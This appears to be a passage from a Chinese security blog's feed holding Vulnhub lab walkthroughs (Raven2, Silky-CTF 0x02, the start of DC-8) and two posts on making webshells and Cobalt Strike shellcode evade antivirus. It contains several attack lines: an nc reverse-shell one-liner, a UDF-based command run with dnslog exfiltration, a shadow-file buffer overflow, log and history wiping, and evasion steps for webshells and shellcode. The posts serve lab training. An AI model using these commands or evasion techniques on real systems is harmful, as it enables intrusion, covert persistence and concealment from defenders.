alt="image-20240205172249849"></p><p>为了增加爆破的概率，我在用户名中增加了admin、root两个用户，但是依然爆破失败。我们可以用自己的字典多次尝试。以及利用wpscan针对wordpress 的主题和插件漏洞进行扫描利用。</p><h3 id="5、getshell"><a href="#5、getshell" class="headerlink" title="5、getshell"></a>5、getshell</h3><p>wordpress利用较为困难，我们将目光再转向PHPMailer。</p><p>我们优先使用如下几个远程代码执行脚本</p><p><img src="/img/Vulnhub-Raven2/image-20240205172633118.png" alt="image-20240205172633118"></p><p>将四个脚本复制到本路径下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp php/webapps/40968.sh /c/Users/Administrator/Desktop/test/script/</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205172851755.png" alt="image-20240205172851755"></p><p>在40974.py中，我们修改脚本内容如下，同时在本地起一个4444的监听</p><p><img src="/img/Vulnhub-Raven2/image-20240205190108255.png" alt="image-20240205190108255"></p><p>然后执行该脚本，访问contact.php文件，会生成shell.php 文件，内容则是反弹shell，再访问shell.php，则拿到shell</p><p><img src="/img/Vulnhub-Raven2/image-20240205190259052.png" alt="image-20240205190259052"></p><h1 id="四、提权至root"><a href="#四、提权至root" class="headerlink" title="四、提权至root"></a>四、提权至root</h1><h3 id="1、翻找敏感文件"><a href="#1、翻找敏感文件" class="headerlink" title="1、翻找敏感文件"></a>1、翻找敏感文件</h3><p>1、数据库的账号密码</p><p>我们知道在wordpress 框架下可以找到数据库的账号密码，在wp-config.php 文件中</p><p><img src="/img/Vulnhub-Raven2/image-20240206133212310.png" alt="image-20240206133212310"></p><p>拿到MYSQL 数据库的账号密码：root:R@v3nSecurity</p><p>还是一个高权限的账号密码，可能存在数据库提权。</p><p>2、&#x2F;etc&#x2F;passwd文件</p><p>找到两个普通用户michael、steven</p><p>这两个用户名跟用wpscan工具扫描出来的wordpress用户名一样。</p><p>3、&#x2F;home 目录</p><p>普通用户目录下也一无所获</p><p><img src="/img/Vulnhub-Raven2/image-20240206133656277.png" alt="image-20240206133656277"></p><p>4、用find 命令查找高权限文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206134503358.png" alt="image-20240206134503358"></p><p>并没有找到能提权的文件</p><h3 id="2、数据库UDF提权"><a href="#2、数据库UDF提权" class="headerlink" title="2、数据库UDF提权"></a>2、数据库UDF提权</h3><p>我们此时有数据库的高权限用户，可以尝试数据库提权</p><p>1、我们先进入交互式shell，然后再进行数据库连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206135019626.png" alt="image-20240206135019626"></p><p>2、查询是否满足UDF提权条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select user();</span><br><span class="line">select version();</span><br><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">show variables like &#x27;plugin%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206135517495.png" alt="image-20240206135517495"></p><p>满足所有条件</p><p>3、查找udf提权的脚本并复制到本目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd udf</span><br><span class="line">cp exploits/linux/local/1518.c /c/Users/Administrator/Desktop/test</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206141513845.png" alt="image-20240206141513845"></p><p><img src="/img/Vulnhub-Raven2/image-20240206141445761.png" alt="image-20240206141445761">4、在本地进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o 111.so 1518.o -lc</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206141905939.png" alt="image-20240206141905939"></p><p>5、上传至靶机&#x2F;tmp目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line">#在靶机</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.31.50:8000/111.so</span><br></pre></td></tr></table></figure><p>6、之后按照udf提权姿势操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/111.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/111.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;111.so&#x27;;</span><br><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure><p>7、利用dnslog平台进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure><p>如果不进行dnslog回显，结果将是如下：</p><p><img src="/img/Vulnhub-Raven2/image-20240206151817786.png" alt="image-20240206151817786"></p><p>我们利用dnslog 平台进行回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;ping -c 1 `whoami`.hhk1dh.dnslog.cn&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206152819346.png" alt="image-20240206152819346"><img src="/img/Vulnhub-Raven2/image-20240206152833163.png" alt="image-20240206152833163"></p><p><img src="/img/Vulnhub-Raven2/image-20240206152843521.png" alt="image-20240206152843521"></p><h3 id="3、获取root权限"><a href="#3、获取root权限" class="headerlink" title="3、获取root权限"></a>3、获取root权限</h3><p>这个时候我们可以以root权限执行任何命令，我们给find 命令SUID权限，然后通过find进行提权</p><p>1、确认find 的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;ping -c 1 `which find`.hhk1dh.dnslog.cn&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206153227992.png" alt="image-20240206153227992"></p><p>2、给find SUID权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;chmod u+s /usr/bin/find&quot;);</span><br></pre></td></tr></table></figure><p>3、find 命令进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206154445556.png" alt="image-20240206154445556"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub_Silky-CTF_0x02</title>
      <link href="/2024/02/17/Vulnhub-Silky-CTF-0x02/"/>
      <url>/2024/02/17/Vulnhub-Silky-CTF-0x02/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Silky-CTF-0x02-渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Silky-CTF-0x02-渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_Silky-CTF_0x02 渗透"></a>【Vulnhub系列靶场】Vulnhub_Silky-CTF_0x02 渗透</h1><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><p>从网盘下载该靶机，在vm中选择【打开】，选择“我已复制该虚拟机”。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129150403292.png" alt="image-20240129150403292"></p><p>然后设置名称和存储路径，选择【重试】即可。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129150536282.png" alt="image-20240129150536282"></p><p>之后配置靶机的网络连接模式为【NET】模式打开。</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><p>先查看主机主机的IP信息，再通过nmap扫描存活主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn IP</span><br><span class="line">#发现目标192.168.31.54</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129151155765.png" alt="image-20240129151155765"></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>对目标机器的端口进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.54#快速粗略扫描</span><br><span class="line">nmap.exe -p- -min-rate 1000 -sT 192.168.31.54#以1000速率进行TCP详细扫描</span><br><span class="line">nmap.exe -p- -min-rate 1000 -sU 192.168.31.54#以1000速率进行UDP详细扫描</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129151509326.png" alt="image-20240129151509326"></p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129152017366.png" alt="image-20240129152017366"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -Pn -p 22,80 192.168.31.54#对目标开放端口及系统进行详细扫描</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129152728947.png" alt="image-20240129152728947"></p><p>目标是linux 的Debian系统、web采用apache服务。</p><p>22端口可以进行爆破，但是作为web靶场，显然不是让我们这么做，但是不妨用如下尝试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra.exe -L users.txt -P password.txt ssh://192.168.31.54#我们需要提供账号密码的字典即可</span><br><span class="line">#此处不建议进行ssh爆破，怀疑有被封IP的可能。</span><br></pre></td></tr></table></figure><p>如下只是提供了简单的账号密码字典做了演示，并未爆破成功：</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129153510803.png" alt="image-20240129153510803"></p><h3 id="3、web目录扫描"><a href="#3、web目录扫描" class="headerlink" title="3、web目录扫描"></a>3、web目录扫描</h3><p>我们采用dirsearch 进行扫描探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.54</span><br><span class="line">dirsearch -u http://192.168.31.54 -x 404,403#可以过滤404，403的响应</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129152050952.png" alt="image-20240129152050952"></p><h3 id="4、识别web框架"><a href="#4、识别web框架" class="headerlink" title="4、识别web框架"></a>4、识别web框架</h3><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129153012108.png" alt="image-20240129153012108"></p><p>并无任何框架</p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、访问admin-php文件"><a href="#1、访问admin-php文件" class="headerlink" title="1、访问admin.php文件"></a>1、访问admin.php文件</h3><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129153717863.png" alt="image-20240129153717863"></p><p>一个登陆页面，可能存在的漏洞：SQL注入。怀疑：但是我们在端口扫描中并未探测到3306等数据库端口的存在。</p><p>先随便输入账号密码，查看错误信息。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129155018184.png" alt="image-20240129155018184"></p><p>尝试SQL注入，并用sqlmap 进行探测。可无论如何探测，结果都是失败的。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129160144688.png" alt="image-20240129160144688"></p><h3 id="2、发现漏洞"><a href="#2、发现漏洞" class="headerlink" title="2、发现漏洞"></a>2、发现漏洞</h3><p>请出我们的xray，进行被动扫描，发现这个地方果然存在漏洞。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129160320766.png" alt="image-20240129160320766"></p><p>参数username存在CMD注入，也就是命令执行漏洞</p><p>我们用curl进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.31.54/admin.php?username=whoami&amp;password=222222</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129163033098.png" alt="image-20240129163033098"></p><p>确认存在命令执行漏洞</p><h3 id="3、获取反弹shell"><a href="#3、获取反弹shell" class="headerlink" title="3、获取反弹shell"></a>3、获取反弹shell</h3><p>这个时候进行shell反弹，使用如下反弹命令（可以在命令反弹网站进行逐一尝试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 192.168.31.50 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>并用nc进行监听，成功获取shell</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129163627322.png" alt="image-20240129163627322"></p><h1 id="四、提权root"><a href="#四、提权root" class="headerlink" title="四、提权root"></a>四、提权root</h1><h3 id="1、查找SUID文件"><a href="#1、查找SUID文件" class="headerlink" title="1、查找SUID文件"></a>1、查找SUID文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129163847382.png" alt="image-20240129163847382"></p><p>可以看到一个醒目的文件，前去查看。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164023868.png" alt="image-20240129164023868"></p><p>是一个755的SUID文件。</p><h3 id="2、查看shadow文件"><a href="#2、查看shadow文件" class="headerlink" title="2、查看shadow文件"></a>2、查看shadow文件</h3><p>尝试执行该文件</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164142441.png" alt="image-20240129164142441"></p><p>这里有点蒙圈，查看佬的文章得知此处利用缓冲区溢出，利用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cat_shadow $(python -c &#x27;print &quot;A&quot;*64 + &quot;\x62\x59\x6c\x49&quot;&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164347287.png" alt="image-20240129164347287"></p><p>查看到了<code>/etc/shadow</code>文件内容，此时可以对root、silky用户的密码进行爆破</p><h3 id="3、获取root密码"><a href="#3、获取root密码" class="headerlink" title="3、获取root密码"></a>3、获取root密码</h3><p>将查看到的shadow文件中的账号密码复制保存到本地，提取能登陆的账号密码</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164854076.png" alt="image-20240129164854076"></p><p>用john 进行破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john.exe --wordlist=..\rockyou.txt pass.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129170910351.png" alt="image-20240129170910351"></p><p>可以看到，已经破解出来root的密码</p><h3 id="4、提权到root"><a href="#4、提权到root" class="headerlink" title="4、提权到root"></a>4、提权到root</h3><p>我们尝试su 到root用户，却出现了意外。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129171004305.png" alt="image-20240129171004305"></p><p>这个情况还是头一次见，问GPT得知是因为不是一个交互式的终端导致的。</p><p>用如下命令切换到交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure><p>在进行root成功</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129171213571.png" alt="image-20240129171213571"></p><h1 id="五、痕迹清理"><a href="#五、痕迹清理" class="headerlink" title="五、痕迹清理"></a>五、痕迹清理</h1><h3 id="1、web日志清理"><a href="#1、web日志清理" class="headerlink" title="1、web日志清理"></a>1、web日志清理</h3><p>先找到web日志的位置，我们在一开始信息收集中知道网站采用apache2服务。我们可以直接查找apache2的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name apache2.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129193343.png" alt="image_20240129193343.png"></p><p>查找log 的相关位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/apache2/apache2.conf | grep log</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129194029.png" alt="image_20240129194029.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name error.log 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129194339.png" alt="image_20240129194339.png"></p><p>将apache2的日志下的文件都删除掉，顺便把看到的mysql的日志一并删除。</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129194419.png" alt="image_20240129194419.png"></p><h3 id="2、登录日志清理"><a href="#2、登录日志清理" class="headerlink" title="2、登录日志清理"></a>2、登录日志清理</h3><p>当我们登录一台机器的时候会在机器的登录日志中留下痕迹。</p><p>日志位置：&#x2F;var&#x2F;log&#x2F;auth.log（Centos系统是&#x2F;var&#x2F;log&#x2F;secure）</p><p>可以直接删除该文件，也可以用如下命令只删除几行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed $(($(sed -n &#x27;$=&#x27; auth.log)-10+1)),$&#123;A&#125;d -i auth.log#删除倒数10行</span><br></pre></td></tr></table></figure><h3 id="3、历史命令清理"><a href="#3、历史命令清理" class="headerlink" title="3、历史命令清理"></a>3、历史命令清理</h3><p>此次是从www用户直接到root，因此我们只需要直接清除root用户的历史命令就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; ~/.bash_history &amp;&amp; history -c</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【免杀专栏】Webshell 免杀过360、D盾、河马</title>
      <link href="/2024/02/17/Anti-AntiVirus-Webshell-rouji/"/>
      <url>/2024/02/17/Anti-AntiVirus-Webshell-rouji/</url>
      
        <content type="html"><![CDATA[<h1 id="【免杀专栏】Webshell-免杀过360、D盾、河马"><a href="#【免杀专栏】Webshell-免杀过360、D盾、河马" class="headerlink" title="【免杀专栏】Webshell 免杀过360、D盾、河马"></a>【免杀专栏】Webshell 免杀过360、D盾、河马</h1><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><p>1、rouji脚本</p><p>百度网盘可下载</p><p>GitHub项目地址：<a href="https://github.com/ytMuCheng/ruoji">https://github.com/ytMuCheng/ruoji</a> </p><p>2、环境配置</p><p>python3 的环境模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r re.txt</span><br></pre></td></tr></table></figure><h1 id="二、免杀操作"><a href="#二、免杀操作" class="headerlink" title="二、免杀操作"></a>二、免杀操作</h1><p>运行脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python webshell_bypass_5.1.py -c 1</span><br></pre></td></tr></table></figure><p>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PHP, --php PHP     -p 文件名 or --php 文件名</span><br><span class="line">  -j JSP, --jsp JSP     -j 文件名 or --jsp 文件名</span><br><span class="line">  -c CONFIG, --config CONFIG</span><br><span class="line">                        伪装模板（1-7） -c 1 or --config 1</span><br></pre></td></tr></table></figure><h3 id="1、方式一：免杀蚁剑"><a href="#1、方式一：免杀蚁剑" class="headerlink" title="1、方式一：免杀蚁剑"></a>1、方式一：免杀蚁剑</h3><p>1、蚁剑免杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python webshell_bypass_5.1.py -p shell.php#shell.php是要生成的webshell名称</span><br></pre></td></tr></table></figure><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217151624329.png" alt="image-20240217151624329"></p><p>2、上线蚁剑：</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152934707.png" alt="image-20240217152934707"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217153021578.png" alt="image-20240217153021578"></p><p>3、360、火绒绕过：</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217151813920.png" alt="image-20240217151813920"></p><p>D盾绕过：</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152401086.png" alt="image-20240217152401086"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152334275.png" alt="image-20240217152334275"></p><p>4、河马绕过：</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152606824.png" alt="image-20240217152606824"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152619283.png" alt="image-20240217152619283"></p><h3 id="2、方式二、免杀哥斯拉"><a href="#2、方式二、免杀哥斯拉" class="headerlink" title="2、方式二、免杀哥斯拉"></a>2、方式二、免杀哥斯拉</h3><p>1、哥斯拉免杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python webshell_bypass_5.1.py -p shell-gsl.php</span><br></pre></td></tr></table></figure><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217153959144.png" alt="image-20240217153959144"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217154034876.png" alt="image-20240217154034876"></p><h3 id="3、方式三、免杀冰蝎"><a href="#3、方式三、免杀冰蝎" class="headerlink" title="3、方式三、免杀冰蝎"></a>3、方式三、免杀冰蝎</h3><p>这里需要冰蝎4.0.5</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/193225423-baf0d469-9bd3-43ee-9967-a1cdb7dfd375.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【免杀专栏】CS-shellcode 免杀过360、火绒</title>
      <link href="/2024/02/17/Anti-AntiVirus-CS-shellcode/"/>
      <url>/2024/02/17/Anti-AntiVirus-CS-shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="【免杀专栏】CS-shellcode-免杀过360、火绒"><a href="#【免杀专栏】CS-shellcode-免杀过360、火绒" class="headerlink" title="【免杀专栏】CS-shellcode 免杀过360、火绒"></a>【免杀专栏】CS-shellcode 免杀过360、火绒</h1><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><p>1、掩日（双击运行）</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217133149368.png" alt="image-20240217133149368"></p><p>2、cs 的shellcode</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217133933233.png" alt="image-20240217133933233"></p><h1 id="二、免杀方式"><a href="#二、免杀方式" class="headerlink" title="二、免杀方式"></a>二、免杀方式</h1><h3 id="1、方式一：本地分离"><a href="#1、方式一：本地分离" class="headerlink" title="1、方式一：本地分离"></a>1、方式一：本地分离</h3><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217135029538.png" alt="image-20240217135029538"></p><p>火绒绕过：</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217134949441.png" alt="image-20240217134949441"></p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217135133852.png" alt="image-20240217135133852"></p><p>360绕过：</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217135341075.png" alt="image-20240217135341075"></p><h3 id="2、方式二、网络分离"><a href="#2、方式二、网络分离" class="headerlink" title="2、方式二、网络分离"></a>2、方式二、网络分离</h3><p>暂时搁置</p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>掩日是一款适用于红队的综合免杀工具，其中包括有：通用免杀、本地分离、网络分离等多种免杀方式和杀软识别等功能，操作简单，免杀效果强悍，是一个非常优秀的项目</p>]]></content>
      
      
      <categories>
          
          <category> 免杀专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场_DC-8</title>
      <link href="/2024/02/17/Vulnhub-DC-8/"/>
      <url>/2024/02/17/Vulnhub-DC-8/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-DC-8靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-DC-8靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_DC-8靶场渗透"></a>【Vulnhub系列靶场】Vulnhub_DC-8靶场渗透</h1><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><p>从百度网盘下载</p><p><img src="/img/Vulnhub-DC-8/image-20240203171154383.png" alt="image-20240203171154383"></p><p>在vm中【打开】，并选择位置，可以不用输入名称</p><p><img src="/img/Vulnhub-DC-8/image-20240203171250363.png" alt="image-20240203171250363"></p><p><img src="/img/Vulnhub-DC-8/image-20240203171325101.png" alt="image-20240203171325101"></p><p>打开靶机运行之后，更改网络适配器为NAT即可。</p><p><img src="/img/Vulnhub-DC-8/image-20240203171434414.png" alt="image-20240203171434414"></p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><p><img src="/img/Vulnhub-DC-8/image-20240203171629450.png" alt="image-20240203171629450"></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>1、可以先用-F 参数进行粗略的快速探测</p><p><img src="/img/Vulnhub-DC-8/image-20240203171939947.png" alt="image-20240203171939947"></p><p>2、之后再进行精细探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.58#以最小10000速率进行TCP全端口扫描</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.58#以最小10000速率进行UDP全端口扫描</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203173646700.png" alt="image-20240203173646700"></p><p><img src="/img/Vulnhub-DC-8/image-20240203173308040.png" alt="image-20240203173308040"></p><p>只有TCP开放了22、80端口。</p><p>3、用默认脚本对开放的22、80端口在进行全扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p22,80 192.168.31.58</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203174215473.png" alt="image-20240203174215473"></p><p>确认是一个linux操作系统。</p><p>4、用漏洞脚本对开放端口进行漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.58</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203174154877.png" alt="image-20240203174154877"></p><p>并未发现有用的漏洞，只进行了一些目录探测</p><h3 id="3、web漏洞探测"><a href="#3、web漏洞探测" class="headerlink" 